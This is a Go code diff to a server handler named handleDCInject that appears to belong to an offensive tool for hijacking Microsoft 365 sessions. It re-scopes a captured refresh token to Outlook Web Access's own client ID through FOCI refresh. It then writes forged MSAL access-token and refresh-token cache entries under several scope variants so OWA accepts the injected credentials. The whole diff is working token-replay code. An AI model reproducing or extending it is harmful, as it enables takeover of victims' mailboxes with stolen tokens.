@@ -1061,15 +1061,31 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Get an OWA-scoped access token via FOCI refresh
+	// Extract OWA client ID first so we can use it in the token refresh.
+	// This ensures the token's appid claim matches what OWA's MSAL expects.
+	owaClientID := extractOWAClientID(at)
+
+	// Get an OWA-scoped access token refreshed with OWA's own client ID so
+	// the returned token has appid == owaClientID (MSAL validates this).
 	owaAT := at
 	owaRT := rt
 	if rt != "" {
-		if a, newRT, err := RefreshForScope(rt, tenant, "https://outlook.office.com/.default openid profile email offline_access"); err == nil {
+		if a, newRT, err := refreshForScopeWithClient(rt, tenant, owaClientID,
+			"https://outlook.office.com/.default openid profile email offline_access"); err == nil {
 			owaAT = a
 			if newRT != "" {
 				owaRT = newRT
 			}
+		} else {
+			// Fall back to generic FOCI refresh
+			if a, newRT, err2 := RefreshForScope(rt, tenant,
+				"https://outlook.office.com/.default openid profile email offline_access"); err2 == nil {
+				owaAT = a
+				if newRT != "" {
+					owaRT = newRT
+				}
+			}
+			_ = err
 		}
 	}
 
@@ -1100,16 +1116,36 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	homeAccountID := strings.ToLower(oid + "." + tid)
 	env := "login.microsoftonline.com"
 
-	// Extract OWA's own MSAL client ID from its boot HTML
-	owaClientID := extractOWAClientID(owaAT)
-
 	// Build client_info (base64url of {"uid":"oid","utid":"tid"})
 	ciRaw, _ := json.Marshal(map[string]string{"uid": oid, "utid": tid})
 	clientInfo := base64.RawURLEncoding.EncodeToString(ciRaw)
 
-	scope := "https://outlook.office.com/.default openid profile email offline_access"
-	if sc := jwtStr(claims, "scp"); sc != "" {
-		scope = sc
+	// OWA MSAL uses individual scopes, not /.default.
+	// We write cache entries for multiple scope variants so at least one matches
+	// regardless of which MSAL version / scope format OWA is using.
+	scopeFromToken := jwtStr(claims, "scp") // e.g. "Mail.ReadWrite Calendars.ReadWrite openid profile email offline_access"
+	scopeVariants := []string{
+		"https://outlook.office.com/.default openid profile email offline_access",
+		"openid profile email offline_access https://outlook.office.com/.default",
+		"email https://outlook.office.com/.default offline_access openid profile", // normalized (sorted)
+	}
+	if scopeFromToken != "" {
+		scopeVariants = append(scopeVariants, scopeFromToken)
+		// Also try with full resource prefix on each short scope
+		var fullScopes []string
+		for _, s := range strings.Fields(scopeFromToken) {
+			if !strings.Contains(s, "/") {
+				fullScopes = append(fullScopes, "https://outlook.office.com/"+s)
+			} else {
+				fullScopes = append(fullScopes, s)
+			}
+		}
+		scopeVariants = append(scopeVariants, strings.Join(fullScopes, " "))
+	}
+	// Primary scope for the main cache entry
+	scope := scopeVariants[0]
+	if scopeFromToken != "" {
+		scope = scopeFromToken
 	}
 
 	now := fmt.Sprintf("%d", time.Now().Unix())
@@ -1177,6 +1213,29 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		atKey:      atVal,
 		rtKey:      rtVal,
 		idtKey:     idtVal,
+	}
+
+	// Write AT/RT cache entries for every scope variant so MSAL finds a match
+	// regardless of which exact scope string OWA's version uses for lookup.
+	for _, sv := range scopeVariants {
+		if sv == scope {
+			continue // already written above
+		}
+		extraATKey := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, owaClientID, tid, sv))
+		extraRTKey := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, owaClientID, sv))
+		extraATVal := map[string]interface{}{
+			"cachedAt": now, "clientId": owaClientID, "credentialType": "AccessToken",
+			"environment": env, "expiresOn": exp, "extendedExpiresOn": extExp,
+			"homeAccountId": homeAccountID, "realm": tid, "secret": owaAT,
+			"target": sv, "tokenType": "Bearer",
+		}
+		extraRTVal := map[string]interface{}{
+			"clientId": owaClientID, "credentialType": "RefreshToken",
+			"environment": env, "homeAccountId": homeAccountID,
+			"secret": owaRT, "target": sv,
+		}
+		entries[extraATKey] = extraATVal
+		entries[extraRTKey] = extraRTVal
 	}
 
 	// Also add the MSAL account-keys index that some MSAL versions require
